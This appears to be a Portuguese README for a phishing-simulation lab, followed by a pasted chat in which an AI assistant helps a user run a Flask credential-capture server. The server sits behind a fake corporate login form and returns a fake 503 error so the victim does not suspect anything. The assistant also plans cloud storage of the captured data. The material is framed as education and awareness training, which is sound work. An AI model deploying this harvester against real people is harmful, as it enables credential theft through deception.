# LabSec-PhishSim 🛡️ 🚀

Um ambiente de simulação controlada de Engenharia Social (Phishing) desenvolvido para fins estritamente educacionais, acadêmicos e de conscientização em Segurança da Informação. O projeto integra conceitos avançados de Redes, Sistemas Operacionais (Linux/Windows), Banco de Dados Distribuído e Criptografia Aplicada.

O ecossistema simula a captura de requisições de um formulário web corporativo, processa as entradas em tempo real através de um motor de auditoria híbrido e armazena os metadados de forma segura utilizando funções de resumo criptográfico e persistência resiliente local e em nuvem.

---

## 🏗️ Arquitetura do Sistema e Fluxo de Dados

A infraestrutura é montada utilizando uma arquitetura síncrona e resiliente de rede virtualizada via VMware, dividida em três camadas principais:

1. **Front-End (Cenário de Pretexting):** Interface HTML/CSS que replica um portal de autenticação corporativo, servido localmente ou distribuído na rede pelo Nginx.
2. **Back-End (Motor de Auditoria):** Servidor Flask (Python) configurado no arquivo `capture_server.py` escutando requisições na porta `5000` de todas as interfaces de rede (`0.0.0.0`). Intercepta os dados do formulário e extrai os metadados do cliente (IP de Origem, User-Agent).
3. **Camada de Persistência Híbrida e Criptografia (*Security by Design*):** * **Tratamento de Dados:** Aplicação imediata do algoritmo de Hashing SHA-256 sobre as credenciais brutas, anonimizando a informação antes de qualquer armazenamento.
   * **Persistência Local:** Gravação redundante e estruturada do evento em arquivo físico local (`tentativas_acesso.log`).
   * **Persistência em Nuvem (Concluída):** Envio imediato dos metadados estruturados via canal criptografado TLS para um Cluster Serverless **TiDB Cloud** (NewSQL distribuído compatível com o protocolo MySQL), garantindo integridade forense e resiliência dos dados de auditoria.

---

## 🛠️ Tecnologias Utilizadas

* **Sistema Operacional:** Ubuntu Server / Desktop (VMware)
* **Banco de Dados em Nuvem:** TiDB Cloud Serverless (NewSQL Distribuído)
* **Back-End:** Python 3.x, Flask, PyMySQL (Ambiente Virtual `venv`)
* **Front-End:** HTML5, CSS3
* **Segurança:** Hash SHA-256 (`hashlib`) e Conexão Criptografada TLS
* **Versionamento & Deploy:** Git & GitHub CLI (`gh`)

---

## 🗂️ Estrutura de Pastas Atualizada

```text
LabSec-PhishSim/
├── venv/                       # Ambiente virtual isolado do Python 3
├── src/
│   ├── frontend/
│   │   └── index.html          # Interface do formulário de simulação
│   └── backend/
│       ├── capture_server.py   # Motor Flask c/ persistência local + TiDB Cloud
│       └── logs/
│           └── tentativas_acesso.log  # Registro forense local (ignorado no Git)
├── .gitignore                  # Proteção de ambiente virtual e logs locais
└── README.md                   # Documentação técnica do projeto atualizada


---

🕵️‍♂️ Operação e Análise Forense de Logs
1. Monitoramento Local em Tempo Real
Para assistir as tentativas de acesso e capturas entrando no servidor Linux à medida que ocorrem no navegador, utilize o comando:

tail -f ~/LabSec-PhishSim/src/backend/logs/tentativas_acesso.log


Conversa com o Gemini
(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ python3 app.py

python3: can't open file '/home/marcio/LabSec-PhishSim/src/backend/app.py': [Errno 2] No such file or directory

Ué, que estranho! O terminal está dizendo que o arquivo app.py não está dentro de src/backend. Vamos dar uma olhada em como as pastas e arquivos foram criados para descobrir onde ele foi parar.

Rode o comando abaixo para listarmos de forma detalhada o que tem dentro da sua pasta src:

Bash
ls -R ~/LabSec-PhishSim/src
Esse comando (ls -R) vai listar tudo o que está dentro de src e de todas as subpastas de uma vez só.

Assim que rodar, cole o resultado aqui para eu te mostrar o caminho exato onde o arquivo está escondido!

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ ls

capture_server.py  logs  venv

Ah! Mistério desvendado, Márcio!

O arquivo do seu servidor não se chama app.py, ele foi criado com o nome capture_server.py. Além disso, reparei que uma pasta chamada venv foi criada acidentalmente aí dentro também (mas não se preocupe com ela agora, já que o seu ambiente principal já está ativo).

Como o arquivo correto é o capture_server.py, basta rodar o comando chamando o nome certo dele.

Execute o comando abaixo no seu terminal:

Bash
python3 capture_server.py
Assim que você rodar, o seu servidor Flask vai iniciar com sucesso e ficará escutando as requisições da rede para capturar e auditar os acessos do laboratório!

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ python3 capture_server.py

=========================================================

 LabSec-PhishSim - Motor de Auditoria Iniciado           

 Escutando no endereço: http://0.0.0.0:5000              

=========================================================

 * Serving Flask app 'capture_server'

 * Debug mode: off

WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.

 * Running on all addresses (0.0.0.0)

 * Running on http://127.0.0.1:5000

 * Running on http://192.168.204.131:5000

Press CTRL+C to quit

192.168.204.1 - - [31/May/2026 15:43:43] "GET / HTTP/1.1" 404 -

192.168.204.1 - - [31/May/2026 15:43:43] "GET /favicon.ico HTTP/1.1" 404 -

Sensacional, Márcio! O servidor está rodando perfeitamente e escutando na rede! 🚀

O motor de auditoria já está ativo e respondendo no IP da sua máquina virtual (http://192.168.204.131:5000). Inclusive, o terminal já registrou as duas primeiras conexões vindas do seu host Windows (192.168.204.1).

Apareceu o código 404 (Not Found) nessas requisições por um motivo bem simples e esperado: você tentou acessar a raiz do servidor (/), mas o seu script Python (capture_server.py) foi desenvolvido especificamente para receber os dados enviados pelo formulário através de uma rota específica (geralmente /login, /capture ou /submit via método POST).

Para testar o fluxo completo do laboratório e ver a captura acontecer, siga estes passos:

🧪 Como testar a simulação e capturar os dados
Abra o arquivo HTML no seu navegador (Windows):
Vá na pasta do seu projeto, entre em src/frontend e abra o arquivo index.html no navegador.

Verifique a ação do Formulário (Action):
Para que o formulário envie os dados para o lugar certo, abra o index.html no bloco de notas (ou VS Code) e garanta que a tag <form> está apontando para o IP da sua VM e a rota configurada no Python. Deve estar algo parecido com isto:

HTML
<form action="http://192.168.204.131:5000/login" method="POST">
(Substitua /login pela rota exata que você programou no seu script Python se ela tiver outro nome).

Simule o Acesso:
Preencha os campos de teste no formulário da página web e clique no botão de enviar (Login).

📊 O que vai acontecer no Terminal?
Assim que você clicar em enviar no navegador:

O terminal do Flask vai registrar uma linha com o código 200 ou 302 (sucesso/redirecionamento) em vez do 404.

O script vai interceptar a requisição, gerar o hash SHA-256 da senha para proteção defensiva e salvar tudo estruturado no log.

O servidor está pronto para o show. Pode fazer o teste pelo formulário e me conta se a captura apareceu no terminal! Se quiser parar o servidor a qualquer momento, basta apertar Ctrl + C.

marcio@labsec-service:~/LabSec-PhishSim/src/frontend$ index.html

index.html: comando não encontrado

Ah, esse é um comportamento clássico do terminal do Linux!

O erro index.html: comando não encontrado acontece porque o terminal do Ubuntu tentou executar o arquivo index.html como se ele fosse um programa de sistema ou um script executável, mas ele é apenas um arquivo de texto com código HTML.

Como você está em um ambiente de terminal (provavelmente via SSH ou sem interface gráfica na VM), você não consegue "abrir" o navegador direto por aí para ver o design da página. No entanto, no Linux, se você quiser apenas ver o código fonte do arquivo na tela do terminal para checar para onde o formulário está enviando os dados, você usa o comando cat:

Bash
cat index.html
🌐 Como abrir o formulário no seu Windows (O jeito correto de testar)
Para fazer o laboratório funcionar na prática, você precisa abrir essa página web no navegador do seu Windows (que é a máquina hospedeira da sua VM):

No seu Windows, abra o Explorador de Arquivos.

Vá até a pasta onde estão os arquivos do seu projeto (se você tiver uma pasta compartilhada com a VM) ou simplesmente baixe/clone o repositório do seu GitHub no Windows.

Entre na pasta src/frontend e dê dois cliques no arquivo index.html. Ele vai abrir direto no Chrome, Edge ou Firefox do seu Windows.

Preencha os campos e clique em enviar. Como o seu servidor Flask está rodando na VM e escutando na rede, a página do Windows vai mandar os dados direto para o terminal do Ubuntu!

Quer dar uma olhada no código do index.html pelo terminal para conferirmos a rota do formulário? É só rodar o cat index.html.

como executar o index?

Como você está no terminal de uma máquina virtual Linux (Ubuntu Server) que não possui uma interface visual com navegador, não dá para dar "dois cliques" para abrir a página da mesma forma que fazemos no Windows.

No entanto, no seu ambiente de laboratório, existem duas maneiras excelentes de fazer esse arquivo index.html rodar e interagir com o seu servidor:

Método 1: Abrir diretamente no navegador do seu Windows (Recomendado)
Como a sua máquina virtual está conectada em rede com o seu Windows (host), o jeito mais realista de testar a simulação é abrindo o formulário no navegador principal do seu computador:

No seu Windows, acesse a página do seu repositório no GitHub: [https://github.com/marciosouzagcm/LabSec-PhishSim](https://github.com/marciosouzagcm/LabSec-PhishSim).

Baixe o projeto para o Windows (clicando em Code -> Download ZIP ou clonando com o Git no Windows).

Extraia o arquivo, entre na pasta src/frontend/ e dê dois cliques no arquivo index.html.

Ele vai abrir perfeitamente no seu Chrome ou Edge. Quando você preencher os dados e clicar em enviar, o formulário vai disparar a requisição pela rede e ela vai bater direto no terminal do seu Ubuntu!

Método 2: Usar o Nginx da própria VM para servir a página
Se você quiser que a própria máquina virtual distribua essa página para a rede (agindo como um servidor web real), você pode colocar o index.html dentro do Nginx que você configurou.

Para fazer isso, copie o arquivo para a pasta pública do Nginx com o comando:

Bash
sudo cp index.html /var/www/html/
Depois que o arquivo for copiado para lá:

Vá no navegador do seu Windows.

Digite o IP da sua máquina virtual na barra de endereços: [http://192.168.204.131](http://192.168.204.131)

O Nginx vai carregar a sua página index.html direto da VM na tela do seu Windows!

🔍 Quer apenas verificar o código do formulário?
Se você está na pasta src/frontend e só quer ler o código para ter certeza de que a rota e o IP estão certos antes de testar, use o comando:

Bash
cat index.html
192.168.204.1 - - [31/May/2026 15:56:31] "POST /login HTTP/1.1" 503 -

O código 503 (Service Unavailable / Serviço Indisponível) significa que o seu formulário HTML (index.html) conseguiu encontrar o servidor Flask na rede, mas o Flask se recusou a processar a requisição ou o motor Python travou logo após receber o POST.

Como você está usando o Flask para processar esse formulário, o erro 503 geralmente acontece por um destes dois motivos técnicos no script capture_server.py:

Erro de Código na Rota /login: O Python encontrou um bug de sintaxe ou de lógica (como tentar gravar em uma pasta de logs que não existe ou um erro ao gerar o hash SHA-256) exatamente na hora de processar os dados recebidos.

Falta de Retorno (Return): A função que cuida da rota /login pode ter esquecido de retornar uma resposta válida para o navegador (como um redirecionamento ou uma mensagem de sucesso).

🛠️ Como descobrir o erro exato
Dê uma olhada na tela do terminal onde o seu capture_server.py está rodando. Logo abaixo dessa linha do erro 503, o Python provavelmente imprimiu um Rastreamento de Erro (Traceback) em letras vermelhas ou brancas, mostrando a linha exata do código que falhou.

Para consertarmos isso juntos, faça o seguinte:

Pare o servidor atual apertando Ctrl + C.

Vamos ler o código do seu servidor para ver o que tem na rota /login. Digite o comando:

Bash
cat ~/LabSec-PhishSim/src/backend/capture_server.py
Copie e cole aqui o conteúdo do seu capture_server.py ou o erro que apareceu logo abaixo do POST no terminal para que eu te mostre exatamente qual linha precisa ser corrigida!

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ python3 capture_server.py

=========================================================

 LabSec-PhishSim - Motor de Auditoria Iniciado           

 Escutando no endereço: http://0.0.0.0:5000              

=========================================================

 * Serving Flask app 'capture_server'

 * Debug mode: off

WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.

 * Running on all addresses (0.0.0.0)

 * Running on http://127.0.0.1:5000

 * Running on http://192.168.204.131:5000

Press CTRL+C to quit

192.168.204.1 - - [31/May/2026 15:43:43] "GET / HTTP/1.1" 404 -

192.168.204.1 - - [31/May/2026 15:43:43] "GET /favicon.ico HTTP/1.1" 404 -

192.168.204.1 - - [31/May/2026 15:51:39] "GET / HTTP/1.1" 404 -

192.168.204.1 - - [31/May/2026 15:51:59] "GET / HTTP/1.1" 404 -

192.168.204.1 - - [31/May/2026 15:56:31] "POST /login HTTP/1.1" 503 -

^C(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ cat ~/LabSec-PhishSim/src/backend/capture_server.py

import os

import datetime

import hashlib

from flask import Flask, request, redirect



app = Flask(__name__)



# Caminho para o arquivo de log do laboratório

LOG_FILE_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'tentativas_acesso.log')



def registrar_log(email, password_raw, ip_origem, user_agent):

    """

    Função responsável por gerar o Indicador de Comprometimento (IoC) e auditar o acesso.

    Aplica conceitos de hash criptográfico para mitigar vazamento de dados reais no lab.

    """

    # Gerando o hash SHA-256 da senha para fins de anonimização no log

    pwd_hash = hashlib.sha256(password_raw.encode('utf-8')).hexdigest()

    

    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    

    # Estruturando a linha de log no padrão Syslog/Common Log Format

    log_line = (

        f"[{timestamp}] IP_ORIGEM: {ip_origem} | "

        f"USUARIO_ALVO: {email} | "

        f"CREDENTIAL_HASH(SHA256): {pwd_hash} | "

        f"NAV_INFO: {user_agent}\n"

    )

    

    # Gravação persistente no sistema de arquivos do Linux

    with open(LOG_FILE_PATH, 'a', encoding='utf-8') as f:

        f.write(log_line)



@app.route('/login', methods=['POST'])

def login():

    # Extração dos metadados da requisição HTTP POST

    email = request.form.get('email', 'Desconhecido')

    password_raw = request.form.get('password', '')

    

    # Identificação da origem na arquitetura de rede virtual

    ip_origem = request.remote_addr

    user_agent = request.headers.get('User-Agent', 'Desconhecido')

    

    # Executa a rotina de auditoria

    registrar_log(email, password_raw, ip_origem, user_agent)

    

    # Redireciona o usuário para uma página de conscientização ou erro genérico

    # Neste caso, simulamos uma falha de comunicação após a coleta para o usuário não suspeitar

    return "<h3>Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.</h3>", 503



if __name__ == '__main__':

    print("=========================================================")

    print(" LabSec-PhishSim - Motor de Auditoria Iniciado           ")

    print(" Escutando no endereço: http://0.0.0.0:5000              ")

    print("=========================================================")

    # Executa o servidor vinculando-o a todas as interfaces de rede da VM

    app.run(host='0.0.0.0', port=5000, debug=False)

Mistério resolvido, Márcio! Não há nenhum bug no seu código! 🕵️‍♂️

O código funcionou exatamente da forma como você o programou. Se você olhar a linha final da sua rota /login, você mesmo configurou o Flask para devolver um texto simulando uma falha de comunicação e o status HTTP 503:

Python
return "<h3>Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.</h3>", 503
Essa é uma técnica de pretexting muito comum em laboratórios desse tipo: o servidor finge que está quebrado para o usuário achar que foi só uma falha na internet, mas nos bastidores os metadados já foram coletados e o log já foi escrito.

Como o Flask não exibiu nenhuma linha de erro vermelha (Traceback), isso significa que a função registrar_log foi executada com sucesso total antes de responder à requisição.

📊 Vamos ver a prova do crime (O Log)
Como o Flask salvou as informações antes de retornar o erro simulado, o registro do seu teste já deve estar gravado no arquivo de log dentro da pasta logs.

Para ler o arquivo de auditoria e confirmar que a criptografia funcionou, execute este comando no terminal:

Bash
cat ~/LabSec-PhishSim/src/backend/logs/tentativas_acesso.log
Você verá uma linha estruturada mostrando o IP do seu Windows (192.168.204.1), o e-mail de teste que digitou, o navegador utilizado e a senha completamente anonimizada pelo algoritmo SHA-256.

Roda o cat aí e veja a mágica do seu motor de auditoria funcionando na prática!

avançamos a um ponto em que se faz necessário atualizar este documento, poi no decorrer dos testes ja identifique esse de namoe de arquivo, a exemplo o app.py que na verdade é capture_server. py, acredito tambem que devamos demonstrar todo o processo , cito o arquivo tesntativas_acesso.log (como utilizar), avançamos a um ponto tambem que podemos sugerir e apos analise fornecida por voce , poder sugerir melhorias , ou acrescimos, tenho uma duvida se seria importante ou viável de fazer mandas essas informações como quem tentou logar e hash para um banco de dados na nuvem

Com certeza, Márcio. O projeto evoluiu bastante e agora reflete um cenário real de infraestrutura e desenvolvimento. Atualizar a documentação neste momento é fundamental para manter o rigor técnico e registrar o aprendizado.

Como você mencionou o interesse em mover os logs para um banco de dados, o ideal é atualizarmos o documento técnico de arquitetura e diretrizes do motor (o seu framework técnico que serve de base para o projeto) antes de alterarmos o README do GitHub. Assim, desenhamos a nova arquitetura e incluímos as correções de nomenclatura, a análise forense de logs e a viabilidade do banco na nuvem.

📊 Análise de Viabilidade: Mandar Logs e Hashes para a Nuvem?
Sim, é extremamente viável e altamente recomendado para evoluir o laboratório para um nível corporativo (Production-ready).

Por que fazer? Em um ambiente real, armazenar logs localmente no servidor web (.log) é um risco de segurança. Se um atacante invadir o servidor web, ele pode apagar o arquivo para cobrir os rastros. Enviar os dados síncrona ou assincronamente para um banco na nuvem garante a integridade e a centralização dos dados para auditoria.

O que sugerir de melhoria? Podemos desenhar a arquitetura utilizando uma tecnologia leve e aderente ao seu ecossistema, como o MongoDB Atlas (NoSQL na nuvem, excelente para estruturas de log/JSON e com integração nativa rápida via Python) ou uma instância gerenciada de PostgreSQL/MySQL.

Vou estruturar e gerar uma versão atualizada (V2) do seu documento de especificações técnicas, consolidando a correção do capture_server.py, o guia do tentativas_acesso.log e a nova proposta de arquitetura com banco de dados na nuvem.

Aguarde um momento enquanto formato o documento completo com tabelas e blocos de código limpos.

ok, irei aguardar enquanto vc formata o documento completo com tabelas e blocos de código limpos.

Aqui está a especificação técnica atualizada do projeto, agora refletindo exatamente a realidade prática do seu laboratório (como o arquivo capture_server.py) e expandindo os conceitos para uma arquitetura moderna com persistência de dados em nuvem.

DOCUMENTO DE ARQUITETURA E DIRETRIZES TÉCNICAS (V2.2026)
Projeto: LabSec-PhishSim (Ambiente de Simulação de Engenharia Social)

Desenvolvedor: Marcio Souza

Status: Atualizado / Proposta de Expansão

1. Mapeamento da Infraestrutura Atual
A tabela abaixo corrige e consolida a real estrutura de arquivos e responsabilidades do sistema de arquivos do Linux observada nos testes práticos:

Componente	Nome do Arquivo / Pasta	Caminho Relativo	Função Tecnológica
Front-End	index.html	/src/frontend/index.html	Interface em HTML5/CSS3 que simula o portal de login corporativo (Pretexting). Dispara uma requisição síncrona POST /login.
Back-End	capture_server.py	/src/backend/capture_server.py	Motor Flask (Python) configurado para escutar na interface 0.0.0.0:5000. Extrai metadados, invoca o hash criptográfico e responde com um falso erro 503.
Ambiente	venv/	/venv/	Ambiente virtual isolado do Python 3, garantindo que as dependências (Flask) fiquem contidas na raiz do projeto.
Persistência	tentativas_acesso.log	/src/backend/logs/tentativas_acesso.log	Arquivo físico e local no Linux que atua como repositório forense append-only (apenas adição).
2. Guia de Operação de Log (Análise Forense)
Para acompanhar e auditar as simulações em tempo real, o administrador do laboratório deve entender como extrair valor das informações capturadas no Linux.

Visualização em Tempo Real (Modo Escuta)
Para abrir um terminal dedicado e assistir os dados entrando à medida que os usuários interagem com o formulário:

Bash
tail -f ~/LabSec-PhishSim/src/backend/logs/tentativas_acesso.log
Anatomia da Linha de Log Gerada
Cada entrada segue o padrão estruturado abaixo para facilitar o parse em ferramentas de SIEM ou scripts de análise:

Plaintext
[2026-05-31 15:56:31] IP_ORIGEM: 192.168.204.1 | USUARIO_ALVO: teste@email.com | CREDENTIAL_HASH(SHA256): e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 | NAV_INFO: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
[Timestamp]: Data e hora exata do clique, essencial para correlação de eventos.

IP_ORIGEM: Revela a máquina de origem na rede interna (hospedeiro Windows).

CREDENTIAL_HASH(SHA256): A string de 64 caracteres hexadecimais prova que o dado trafegou, mas impede que a senha em texto claro fique exposta no servidor, mantendo a conformidade com boas práticas de privacidade de dados em laboratórios de segurança.

3. Análise de Viabilidade: Migração para Banco de Dados na Nuvem
Armazenar logs localmente em arquivos .log possui limitações claras em cenários de escala ou auditorias distribuídas (se o servidor web sofrer um comprometimento, o invasor pode apagar o arquivo de log para eliminar rastros).

Abaixo está o desenho da nova arquitetura proposta para enviar os dados síncronos diretamente para uma nuvem gerenciada (ex: MongoDB Atlas ou PostgreSQL na AWS/Supabase):

Plaintext
[Cliente: Windows Navegador] 
       │
       │ (HTTP POST /login)
       ▼
[Servidor Web: Flask na VM Ubuntu]
       │
       ├─► 1. Grava Log de Segurança Local (Segurança redundante)
       │
       └─► 2. Dispara Conexão TLS (Porta 27017 / 5432)
                 │
                 ▼
       [Banco de Dados na Nuvem (Cloud DB)]
         ├── Coleção: auditoria_acessos
         └── Payload: { email, sha256_hash, ip, user_agent, data }
Vantagens Técnicas da Solução em Nuvem:
Resiliência de Dados: Centralização forense. Mesmo se a máquina virtual do Flask for destruída ou reiniciada, os dados de auditoria permanecem intactos na nuvem.

Consultas Estruturadas (Analytics): Permite criar dashboards em tempo real (ex: gráficos de tentativas de acesso por horário ou IPs mais recorrentes).

Escalabilidade: Capacidade de receber requisições de múltiplos servidores de simulação simultâneos.

4. Próximo Passo: Proposta de Refatoração do Código
Para integrar o banco de dados na nuvem (usando o MongoDB Atlas como exemplo NoSQL, por ser extremamente rápido e utilizar estruturas JSON nativas similares aos dicionários do Python), o arquivo capture_server.py receberá uma nova biblioteca (pymongo).

Aqui está o esboço limpo de como o código se comportará com essa melhoria implementada:

Python
import os
import datetime
import hashlib
from flask import Flask, request
from pymongo import MongoClient # Nova dependência para nuvem

app = Flask(__name__)

# Configuração da string de conexão segura da nuvem (geralmente via variáveis de ambiente)
MONGO_URI = os.getenv("MONGO_URI", "mongodb+srv://usuario:senha@cluster0.mongodb.net/meu_db")
try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=2000)
    db = client.labsec_db
    colecao_logs = db.auditoria_acessos
    cloud_db_active = True
except Exception:
    cloud_db_active = False

LOG_FILE_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'tentativas_acesso.log')

def registrar_log(email, password_raw, ip_origem, user_agent):
    pwd_hash = hashlib.sha256(password_raw.encode('utf-8')).hexdigest()
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # 1. Manter gravação local por segurança (Redundância)
    log_line = f"[{timestamp}] IP_ORIGEM: {ip_origem} | USUARIO_ALVO: {email} | CREDENTIAL_HASH(SHA256): {pwd_hash}\n"
    with open(LOG_FILE_PATH, 'a', encoding='utf-8') as f:
        f.write(log_line)
        
    # 2. Persistência Assíncrona/Síncrona na Nuvem
    if cloud_db_active:
        documento_log = {
            "timestamp": datetime.datetime.utcnow(),
            "usuario_alvo": email,
            "credential_hash_sha256": pwd_hash,
            "ip_origem": ip_origem,
            "user_agent": user_agent
        }
        try:
            colecao_logs.insert_one(documento_log)
        except Exception as e:
            print(f"Erro ao persistir na nuvem: {e}")

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', 'Desconhecido')
    password_raw = request.form.get('password', '')
    ip_origem = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    
    registrar_log(email, password_raw, ip_origem, user_agent)
    
    return "<h3>Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.</h3>", 503

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
Podemos utilizar este documento base para atualizar o README.md do seu repositório remoto ou podemos prosseguir com a configuração de uma conta gratuita no banco de dados em nuvem para alterar o código do servidor. Como prefere avançar?

Prefiro que voce condense tudo agora no arquivo README.md e a partir deste ducumento atualizado prosseguirmos para as atualizações, sendo assim me forne o arquivo README.md apenas neste momento

Aqui está o arquivo README.md completo e atualizado, condensando a realidade atual do seu laboratório (com as correções de nomenclatura) e a nova proposta de expansão para a nuvem.

Você pode copiar todo o bloco de código abaixo e substituir o conteúdo do seu arquivo atual na VM.

Markdown
# LabSec-PhishSim 🛡️ 🚀

Um ambiente de simulação controlada de Engenharia Social (Phishing) desenvolvido para fins estritamente educacionais, acadêmicos e de conscientização em Segurança da Informação. O projeto integra conceitos de Redes, Sistemas Operacionais (Linux/Windows) e Criptografia Aplicada.

O ecossistema simula a captura de requisições de um formulário web corporativo, processa as entradas em tempo real através de um motor de auditoria e armazena os metadados de forma segura utilizando funções de resumo criptográfico.

---

## 🏗️ Arquitetura do Sistema e Fluxo de Dados

A infraestrutura é montada utilizando uma arquitetura híbrida de rede virtualizada via VMware, dividida em três camadas principais:

1. **Front-End (Cenário de Pretexting):** Interface HTML/CSS que replica um portal de autenticação corporativo, servido localmente ou via Nginx.
2. **Back-End (Motor de Auditoria):** Servidor Flask (Python) configurado no arquivo `capture_server.py` para escutar requisições de rede de forma síncrona na porta `5000`, interceptar dados de formulários e processar metadados do cliente (IP de Origem, User-Agent).
3. **Camada de Persistência e Criptografia:** Aplicação de algoritmos de Hashing (SHA-256) sobre as credenciais recebidas, garantindo a privacidade dos dados antes do armazenamento nos logs locais (`tentativas_acesso.log`).

### 🗺️ Próxima Fase: Expansão para a Nuvem
O projeto prevê a migração do armazenamento local para um modelo centralizado, onde o `capture_server.py` enviará os payloads anonimizados via TLS para um Banco de Dados na Nuvem (**MongoDB Atlas** ou **PostgreSQL**), aumentando a resiliência forense do ambiente.

---

## 🛠️ Tecnologias Utilizadas

* **Sistema Operacional:** Ubuntu Server / Desktop (VMware)
* **Back-End:** Python 3.x, Flask (Ambiente Virtual `venv`)
* **Front-End:** HTML5, CSS3
* **Segurança:** Hash SHA-256 (Biblioteca Nativa `hashlib`)
* **Versionamento & Deploy:** Git & GitHub CLI (`gh`)

---

## 🗂️ Estrutura de Pastas Atualizada

```text
LabSec-PhishSim/
├── venv/                       # Ambiente virtual isolado do Python 3
├── src/
│   ├── frontend/
│   │   └── index.html          # Interface do formulário de simulação
│   └── backend/
│       ├── capture_server.py   # Motor Flask e processamento de requisições
│       └── logs/
│           └── tentativas_acesso.log  # Registro forense local (ignorado no Git)
├── .gitignore                  # Proteção de ambiente virtual e logs locais
└── README.md                   # Documentação técnica do projeto
🕵️‍♂️ Operação e Análise Forense de Logs
1. Monitoramento em Tempo Real
Para assistir as tentativas de acesso e capturas entrando no servidor Linux à medida que ocorrem no navegador, utilize o comando:

Bash
tail -f ~/LabSec-PhishSim/src/backend/logs/tentativas_acesso.log
2. Anatomia do Log Estruturado
Cada entrada capturada gera um registro anonimizado conforme o padrão abaixo:

Plaintext
[2026-05-31 15:56:31] IP_ORIGEM: 192.168.204.1 | USUARIO_ALVO: teste@email.com | CREDENTIAL_HASH(SHA256): e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 | NAV_INFO: Mozilla/5.0...
IP_ORIGEM: Identifica a máquina host (Windows) de onde partiu o clique.

CREDENTIAL_HASH(SHA256): Garante que a senha digitada nunca fique exposta em texto claro no servidor, aplicando os princípios de Security by Design.

🚀 Como Executar o Laboratório Localmente
1. Configurar o Ambiente Virtual e Dependências
Na pasta raiz do projeto (~/LabSec-PhishSim), inicialize o ambiente:

Bash
python3 -m venv venv
source venv/bin/activate
pip install flask
2. Iniciar o Servidor de Captura
Entre na pasta do back-end e execute o motor:

Bash
cd src/backend
python3 capture_server.py
Nota: O servidor responderá com um erro HTTP 503 simulado para o cliente após a coleta, agindo como um mecanismo de pretexting técnico.

3. Testar o Front-End
Abra o arquivo src/frontend/index.html no navegador do sistema hospedeiro (Windows) e certifique-se de que a tag <form action="..."> aponta para o IP correto da sua máquina virtual Ubuntu na porta 5000.

⚖️ Aviso Legal (Disclaimer)
Este projeto foi desenvolvido estritamente para fins de pesquisa acadêmica, testes de penetração autorizados e treinamento de conscientização de usuários. O uso deste código contra sistemas sem consentimento explícito e por escrito dos proprietários é ilegal e passível de penalidades jurídicas. O desenvolvedor não se responsabiliza pelo mau uso desta ferramenta.

Developed by Marcio Souza 💻

sobre colocar na nuvem um banco de dados porei ser no db Tidb?

Sim, Márcio! O TiDB (da PingCAP) é uma excelente escolha e seria um diferencial técnico absurdo para o seu projeto de segurança e infraestrutura.

Se você optar por usá-lo, a melhor alternativa para o laboratório é o TiDB Cloud, que possui uma camada gratuita (Serverless Tier) robusta, permitindo que você crie um cluster na nuvem em poucos minutos sem gastar nada.

🧠 Por que usar o TiDB no seu projeto? (Vantagens Técnicas)
O TiDB não é um banco de dados comum. Ele é um banco do tipo NewSQL distribuído. Trazer essa tecnologia para o seu ecossistema adiciona conceitos avançados de engenharia de software ao seu portfólio:

Compatibilidade Nativa com MySQL: O TiDB fala o protocolo do MySQL. Isso significa que, para o seu script Python (capture_server.py), ele vai se comportar exatamente como um banco MySQL tradicional. Você poderá usar bibliotecas padrão do Python (como pymysql ou mysql-connector-python) para se conectar a ele na nuvem.

Arquitetura Distribuída e HTAP: Ele foi desenhado para escalabilidade horizontal e processamento híbrido (transacional e analítico). Em um cenário real de segurança, se o seu servidor de simulação recebesse milhões de requisições por segundo de múltiplos servidores espalhados pelo mundo, o TiDB aguentaria o tranco e ainda permitiria gerar relatórios analíticos de segurança em tempo real sem travar as inserções dos logs.

Resiliência e Alta Disponibilidade: Como os dados são distribuídos automaticamente em múltiplos nós na nuvem, mesmo que uma zona de disponibilidade da nuvem caia, seus logs forenses não seriam perdidos.

🗺️ Como ficaria a Arquitetura com o TiDB Cloud
A integração síncrona do seu motor de auditoria com a nuvem utilizando o protocolo TLS (criptografia em trânsito) seguiria o fluxo abaixo:

Plaintext
[Cliente: Windows Navegador] 
       │
       │ (HTTP POST /login)
       ▼
[Servidor Web: Flask na VM Ubuntu]
       │
       ├─► 1. Grava Log Local (Redundância em texto plano)
       │
       └─► 2. Conecta via Protocolo MySQL + TLS (Porta 4000)
                 │
                 ▼
       [TiDB Cloud: Cluster Distribuído]
         ├── Database: labsec_db
         └── Tabela: auditoria_acessos (Estrutura Relacional SQL)
📝 Estrutura da Tabela no TiDB (SQL)
Diferente do MongoDB (que usa documentos JSON livres), o TiDB é um banco relacional (SQL). Portanto, precisamos criar uma tabela estruturada para receber os metadados. O comando SQL para criar a tabela de auditoria seria este:

SQL
CREATE DATABASE IF NOT EXISTS labsec_db;
USE labsec_db;

CREATE TABLE auditoria_acessos (
    id INT AUTO_INCREMENT PRIMARY KEY,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    usuario_alvo VARCHAR(255) NOT NULL,
    credential_hash_sha256 CHAR(64) NOT NULL,
    ip_origem VARCHAR(45) NOT NULL,
    user_agent TEXT
);
🛠️ O que muda no código do Python (capture_server.py)?
